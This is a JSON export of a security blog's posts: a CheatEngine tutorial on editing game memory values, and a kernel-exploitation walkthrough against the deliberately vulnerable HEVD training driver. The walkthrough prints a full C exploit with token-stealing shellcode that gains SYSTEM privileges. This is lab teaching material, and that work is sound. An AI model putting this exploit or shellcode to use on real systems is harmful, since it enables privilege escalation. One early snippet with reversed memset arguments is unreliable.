[ { "title": "CheatEngine: Hacking games memory", "url": "/posts/Game-Hacking-CheatEngine/", "categories": "Reversing, Games", "tags": "Memory, Windows, Games", "date": "2020-07-10 09:00:00 +0200", "snippet": "Hi all!I like to reverse and crack stuff, and videogames is probably one of the most fun things to hack. Rules are okay but what would have happened if Neo followed the rules?? Exactly, he would have got a raise and would be happy with a wonderful fake life.That’s why we like to explain a bit how to start hacking some basic things in a videogame because breaking the rules can be fun also.The game we choose to analyze and hack is a hilarious game made by ChaosMonger Studio, a letonian company with 20 years of experience. Clunky Hero!!The game consist in a simple farmer that one day going back to home after a rough day he discovers his ugly mean wife has been converted in a duck-face lady etcetcetcHow wouldn’t you play this game to see what happens in the end?? look at that muscles and the shiny bucket!State of a gameWhen you want to hack a game first of all you need to play it, the more you play it the more you can analyze and see its behaviour from other perspective. Every stats means variables, so you must ask yourself some questions like “How is this stored? what triggers it? Is there an event that modifies it?”For example, a shoot em up has a score that increments everytime you kill something like an enemy spaceship or an alien, so you ask, “can I change it to 1,000,000 points if I find the variable that stores it?”, we will see it later. In Clunky Hero, we have other variables easy to spot, health and gold amount, so what if I our hero has 10 health points left but we don’t have any potion? we can try to locate a variable called health and put 100 to heal him!Is important to understand that the computer doesn’t see the game as we are seeing it, with an UI and graphics. The computer only understand numbers and to recreate the state of the game each second to present it to you like you see the UI, the computer must search and modify variables like a crazy man inside a giant puppet. To find those variables in memory and modify them we have to use a memory manager that will search into the game’s operating memory.CheatEngineA memory manager is probably the most important tool in a game hacker toolkit and we will use CheatEngine, one of the most famous ones. It’s perfect to find the memory addresses of the game’s data. Be aware that same values can appear in a lot of locations, so for each value we will have an index of registers that contains the number we are searching.One method to know which is the one we are looking for is taking an initial value, for example we start with 9 gold after we kill the first enemy (a drunken bee O.o):So we search for the integer 9 in the CheatEngine (imagine how many registers can have a 9 in it…)Now we avance a little and pick some more gold to look for this new value. After we kill our next enemy (a Big Head Armor Guy :O) we got 16 gold.There come one of the most powerful features of CheatEngine, the increased value search. We go to Scan Type options and select “Increased value by…” and put the 7 gold increase from before and press “Next Scan” button, and these are the new results:We found less registers so we are near our desired register. After another drunken bee kill (O.o) we got 20 gold so we look in CheatEngine for another incremented value by 4 and we end with only 2 registers.Now we need to manipulate these 2 registers to find the correct one adding them to our Cheat Table Panel and modify them by double-clicking in the value register. After changing both registers for a random number like 420, just because, and going to the UI game we know which one is the correct. So we found the memory address that stores the in-game Gold value of the current state!Now let’s try it with the Health of our weird but brave hero. After fighting a Big Head dude and two drunken bees (O.o) our Health Points are 40. We will scan the memory searching for ‘40’ and then get hurt to low the HP and search again. With the help of an angry drunken bee we have our HP down to 30 and by using “Decrement value by…” we search for ‘10’ and we find and unique register. Adding it to the Cheat Table Panel and modifying it with 1337 HP points will change the HP value of the game.Now we can see our hero has now more life points than before and can talk with that poor bee a bit more until she calms down :)Let’s take an example in a shooting game where the final score is important because of competition around the world. The chosen one is a famous shmup, DoDonPachi Resurrection. This game has been one of the most played in competitions in the shumps world so the final score board is important.After killing some stuff and reaching the final boss of the first stage we can see different scores in the left panel, each one being a zone of the stage. We can’t change the actual total score because is dynamic and constantly changing, so we select the first zone score, 63,189,536 points and search for it.We will change it for 64,000,000 points.But as you can see it doesn’t change the total score, which we will try to change after killing the boss. After defeating the Girl-Convertible-Machine-Boss our final score is 80,656,123 points.we search for it and we now find some registers that can store this value so we proceed to add them to our Cheat Table Panel and modify until we find the one that actually changes the number in the game.We change our score for 90,000,000 and the game score reflects exactly that number! Number 1 World here we come!!After some more calculations and dying at the beginning of the second stage we receive final points and go to register our name in the final scoreboard but…whaaaaaaat? the final score that goes to the scoreboad is not the one we modified! Is the previous score (80,656,123) plus some extra points, so what happened?We can’t go deeper for legal reasons but it seems that there is some protection mechanism that keeps the score in a hidden register immutable so anyone can’t cheat the global scoreboard. Another anti-reversing trick we found in this game is when you open the debugger of CheatEngine the client is closed immediately so these people went serious in this port to PC to maintain their competition untouchable.ReferencesI always loved cheats in games and I forgot how much I like to hacks games until I found this great book by Nick Cano, Game Hacking: Developing Autonomous Bots for Online Games. Seriously, if you like hacking games or you are starting this is a great beginning.Also shouts out to Guide Hacking Forum a place with a lot of tutorials and great tips to learn hacking through games.You can buy Clunky Hero by ChaosMonger in this link!Thanks and don’t forget, cheats makes life easier ;)" }, { "title": "Exploiting HackSys Kernel driver", "url": "/posts/Exploiting-HackSys-Kernel-driver/", "categories": "Exploiting, Kernel", "tags": "Kernel, C, Windows", "date": "2020-06-03 09:50:00 +0200", "snippet": "Hi all!Exploiting drivers offers tons of possibilities we couldn’t find in userland so it’s important to learn kernel internals because it will become more important for Windows security.Kernel exploitation is a very complex subject, and the more I learn about it the more I realize I must do basic things first. And that’s what I will explain today, a basic stack buffer overflow in a driver of Windows 7 32-bit. The chosen driver is the famous HEVD (HackSys Extreme Vulnerable Driver), a Windows Kernel driver with vulnerabilites. This vulnerable driver is the main reference to learn Kernel exploitation so if you are interested you can find it here. Special thanks to them!Doing one of the basic exploits in kernel will brings us a lot of knowledge about internals of Windows and drivers.If you want to set up the kernel debugging environment I suggest this article from abatchy or hasherezade’s one.Some internals notesFirst of all, we need to understand how to communicate with the driver, so let’s talk a bit about kernel I/O. The main function to call a driver is DeviceIoControl let’s see a little description about DeviceIOControl: The DeviceIoControl function provides a device input and output control (IOCTL) interface through which an application can communicate directly with a device driver. The DeviceIoControl function is a general-purpose interface that can send control codes to a variety of devices. Each control code represents an operation for the driver to perform. For example, a control code can ask a device driver to return information about the corresponding device, or direct the driver to carry out an action on the device, such as formatting a disk.To reach a specific part of code of the driver you can especify by inserting a code, this code is also known as an IOCTL code: IO Control Codes (IOCTLs) are our primary search target as they include numerous important details we need to know. They are represented as DWORDs but each of the 32 bits represent a detail about the request:Transfer Type - Defines the way that data will be passed to the driver. These can either be METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, or METHOD_NEITHER.Function Code - The internal function to be executed by the driver. These are supposed to start at 0x800 but you will see many starting at 0x0 in practice. Device Type - The type of the driver’s device object specified during IoCreateDevice(). There are many device types defined in Wdm.h and Ntddk.h, but one of the most common to see for software drivers is FILE_DEVICE_UNKNOWN (0x22).Reversing the driverAll Windows drivers must have a DriverEntry routine so Windows can load it. We will use WingDBG Preview to see it:From DriverEntry we look with IDA for IrpDeviceIoCtlHandler, this function processes IOCTL requests done from userland to the HEVD driver, that means, depending the code you use here you can reach the function you want.We want to reach TriggerStackOverflow function, and therefore we need to send a DeviceIoControl() request with a code set to 0x222003 as seen in its code.Inside TriggerStackOverflow we see the length of the KernelBuffer, 0x800h (2048 bytes) where our data is copied. As we will see later, this buffer is not checking size so anything longer that 2048 bytes will crash the driver and the kernel.Building the exploitWe build make our exploit in C language. Why C? because C is the Kernel language so for the sake of symmetry C is the chosen one :)To select the specific driver we want is necessary to get its handler, and we can do that with the CreateFileA from kernel32.dll, a function that allows for handler distribution from kernel-mode.HANDLE driverHandle; printf(&quot;[*]Opening handle to \\\\\\\\.\\\\HackSysExtremeVulnerableDriver\\n&quot;); /* HANDLE WINAPI CreateFile( _In_ LPCTSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile ); */ driverHandle = CreateFileA( DRIVER_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL );After getting the handle of the driver we need to communicate with him by his I/O function, DevideIoControl. Now we can use the handle to call DeviceIoControl and get a crash by sending a large buffer. /* BOOL WINAPI DeviceIoControl( _In_ HANDLE hDevice, _In_ DWORD dwIoControlCode, _In_opt_ LPVOID lpInBuffer, _In_ DWORD nInBufferSize, _Out_opt_ LPVOID lpOutBuffer, _In_ DWORD nOutBufferSize, _Out_opt_ LPDWORD lpBytesReturned, _Inout_opt_ LPOVERLAPPED lpOverlapped ); */ BOOL bof = DeviceIoControl( driverHandle, /* handler for open driver */ STACK_IOCTL, /* IOCTL for the stack overflow */ lpInBuffer, /* our user buffer with retAddr */ RET_OFFSET + sizeof(DWORD), /* want up to the offset + 4 (for the retAddr) sent */ NULL, /* no buffer for the driver to write back to */ 0, /* above buffer of size 0 */ NULL, /* dump variable for byte returned */ NULL); /* ignore overlap */We must stop here to look closer this function because is the most important part of the exploit. A user-supplied buffer is being copied to a kernel buffer without boundary check, resulting in a stack smashing vulnerability if the buffer is longer than 2048 bytes.You can see the vulnerable source code in this lineAs you can see there are three critical parameters: driverHandle: this will get the handle returned from CreateFileA. STACK IOCTL: the I/O code which leads us to the vulnerable function that will trigger the stack overflow. lpInBuffer: user buffer with retAddr RET_OFFSET + sizeof(DWORD): to trigger the vulnerability we need our buffer longer than 2080So the first exploit to get the EIP control is to use a buffer with a pattern (pattern.rb is your friend). We discover the EIP is overwritten at 2080 byte. Let’s put some B’s in the EIP to be sure: char shellcode[4096]; memset(&#39;A&#39;, shellcode, 2080); memset(&#39;B&#39;, &amp;amp;shellcode[2080], 2084); memset(&#39;C&#39;, &amp;amp;shellcode[4164], 3000);Exploit launched and we can find eip register full of ‘0x42’ followed with lots of ‘0x43’.Now that we have control over the EIP our objective is to elevate privileges to NT AUTHORITY\\SYSTEM and the chosen way will be “Token Steal Privilege” also known as “Access Token Manipulation”, more information about it here.In Windows all proccesses has an access token that specifies its security context. So we want our shellcode to steal the token from an elevated proccess and copy it into ours (spoiler, will be a shell).Let’s see the payload HackSys suggests. For a huge and very detailed analysis of the shellcode I recommend Connor McGarr article. Props to him for explaining lots of Windows Internals and WinDBG commands.As a resumee these are the offsets we need to get to our exploit:_KTHREAD offset = 0x124 (from _KPCR)_EPROCESS offset = 0x50 (from _KTHREAD)ActiveProcessLink offset = 0x0b8 (from _EPROCESS)Token offset = 0x0f8 (from EPROCESS)So the shellcode is: char shellcode [] = &quot;\\x60&quot; // pushad &quot;\\x31\\xc0&quot; // xor eax,eax &quot;\\x64\\xa1\\x24\\x01\\x00\\x00&quot; // mov eax,[fs:eax+0x124] &quot;\\x8b\\x40\\x50&quot; // mov eax,[eax+0x50] &quot;\\x89\\xc1&quot; // mov ecx,eax &quot;\\xba\\x04\\x00\\x00\\x00&quot; // mov edx,0x4 &quot;\\x8b\\x80\\xb8\\x00\\x00\\x00&quot; // mov eax,[eax+0xb8] &quot;\\x2d\\xb8\\x00\\x00\\x00&quot; // sub eax,0xb8 &quot;\\x39\\x90\\xb4\\x00\\x00\\x00&quot; // cmp [eax+0xb4],edx &quot;\\x75\\xed&quot; // jne 0x1a &quot;\\x8b\\x90\\xf8\\x00\\x00\\x00&quot; // mov edx,[eax+0xf8] &quot;\\x89\\x91\\xf8\\x00\\x00\\x00&quot; // mov [ecx+0xf8],edx &quot;\\x61&quot; // popad &quot;\\x31\\xc0&quot; // xor eax,eax &quot;\\x5d&quot; // pop ebp &quot;\\xc2\\x08\\x00&quot;; // ret 0x8To evade DEP we will create a memory region RWX permissions with VirtualAlloc() and we will put our shellcode there: LPVOID userBuffer = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!userBuffer) { printf(&quot;Error allocating the user buffer\\n&quot;); exit(1); } printf(&quot;[*] userBuffer @ %p\\n&quot;, userBuffer); memcpy(userBuffer, shellcode, sizeof(shellcode));Launching the exploitSo our final exploit looks like this:#include &amp;lt;windows.h&amp;gt;#include &amp;lt;winioctl.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;#define SHELLCODE_LEN 57#define RET_OFFSET 2080#define DRIVER_PATH &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;#define STACK_IOCTL 0x222003void exploit(void) { typedef void* HANDLE; HANDLE driverHandle; printf(&quot;[*] Opening handle to \\\\\\\\.\\\\HackSysExtremeVulnerableDriver\\n&quot;); /* HANDLE WINAPI CreateFile( _In_ LPCTSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile ); */ driverHandle = CreateFileA( DRIVER_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL ); if (driverHandle == INVALID_HANDLE_VALUE) { printf(&quot;[!] FATAL: Could not open HEVD handle\\n&quot;); return; } char shellcode [] = &quot;\\x60&quot; // pushad &quot;\\x31\\xc0&quot; // xor eax,eax &quot;\\x64\\xa1\\x24\\x01\\x00\\x00&quot; // mov eax,[fs:eax+0x124] &quot;\\x8b\\x40\\x50&quot; // mov eax,[eax+0x50] &quot;\\x89\\xc1&quot; // mov ecx,eax &quot;\\xba\\x04\\x00\\x00\\x00&quot; // mov edx,0x4 &quot;\\x8b\\x80\\xb8\\x00\\x00\\x00&quot; // mov eax,[eax+0xb8] &quot;\\x2d\\xb8\\x00\\x00\\x00&quot; // sub eax,0xb8 &quot;\\x39\\x90\\xb4\\x00\\x00\\x00&quot; // cmp [eax+0xb4],edx &quot;\\x75\\xed&quot; // jnz 0x1a &quot;\\x8b\\x90\\xf8\\x00\\x00\\x00&quot; // mov edx,[eax+0xf8] &quot;\\x89\\x91\\xf8\\x00\\x00\\x00&quot; // mov [ecx+0xf8],edx &quot;\\x61&quot; // popad &quot;\\x31\\xc0&quot; // xor eax,eax &quot;\\x5d&quot; // pop ebp &quot;\\xc2\\x08\\x00&quot;; // ret 0x8 /* LPVOID WINAPI VirtualAlloc( _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ); */ LPVOID userBuffer = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!userBuffer) { printf(&quot;Error allocating the user buffer\\n&quot;); exit(1); } printf(&quot;[*] userBuffer @ %p\\n&quot;, userBuffer); memcpy(userBuffer, shellcode, sizeof(shellcode)); LPVOID payload_ptr = NULL; payload_ptr = userBuffer; const size_t bufSize = RET_OFFSET + sizeof(DWORD); char* lpInBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize); RtlFillMemory(lpInBuffer, bufSize, 0x41); DWORD* address_field = (DWORD*)(lpInBuffer + RET_OFFSET); *address_field = (DWORD)(payload_ptr); /* BOOL WINAPI DeviceIoControl( _In_ HANDLE hDevice, _In_ DWORD dwIoControlCode, _In_opt_ LPVOID lpInBuffer, _In_ DWORD nInBufferSize, _Out_opt_ LPVOID lpOutBuffer, _In_ DWORD nOutBufferSize, _Out_opt_ LPDWORD lpBytesReturned, _Inout_opt_ LPOVERLAPPED lpOverlapped ); */ DWORD size_returned = 0; BOOL bof = DeviceIoControl( driverHandle, /* handler for open driver */ STACK_IOCTL, /* IOCTL for the stack overflow */ lpInBuffer, /* our user buffer with shellcode/address_field */ RET_OFFSET + sizeof(DWORD), /* want up to the offset + 4 (for the address_field) sent */ NULL, /* no buffer for the driver to write back to */ 0, /* above buffer of size 0 */ &amp;amp;size_returned, /* dump variable for byte returned */ NULL); /* ignore overlap *//* check if the device IO sent fine! */ if (!bof) { printf(&quot;[!] Error with DeviceIoControl\\n&quot;); exit(1); } else { printf(&quot;[*] Elevated Shell!\\n\\n\\n&quot;); } VirtualFree(userBuffer, sizeof(shellcode), MEM_RELEASE); userBuffer = NULL;}int main(){ printf(&quot;[*] Launching Exploit...\\n&quot;); exploit(); /* pop a shell with new privileges! */ system(&quot;cmd.exe&quot;); system(&quot;pause&quot;); return 0;}Exploit launched and driver exploited!ConclusionsI hope you learned lots about Windows internals, drivers composition and a new technique for elevating privileges like me!Exploiting in Kernel can be daunting, and WinDBG may not be the best debugger, but with patient and reading a lot, everything is possible :)Special thanks to all these people that were my references for this post:HacksysHackSysTeam (https://github.com/hacksysteam)Connor McGarr (https://connormcgarr.github.io/)Rootkit (https://rootkits.xyz/)Hasherezade (https://hshrzd.wordpress.com/)Blah Cats (https://blahcat.github.io/)Thanks and don’t lose yourself in the kernel!" }, { "title": "Reversing Malware", "url": "/posts/IDT/", "categories": "", "tags": "", "date": "2020-04-22 00:00:00 +0200", "snippet": "Coming soon" } ]
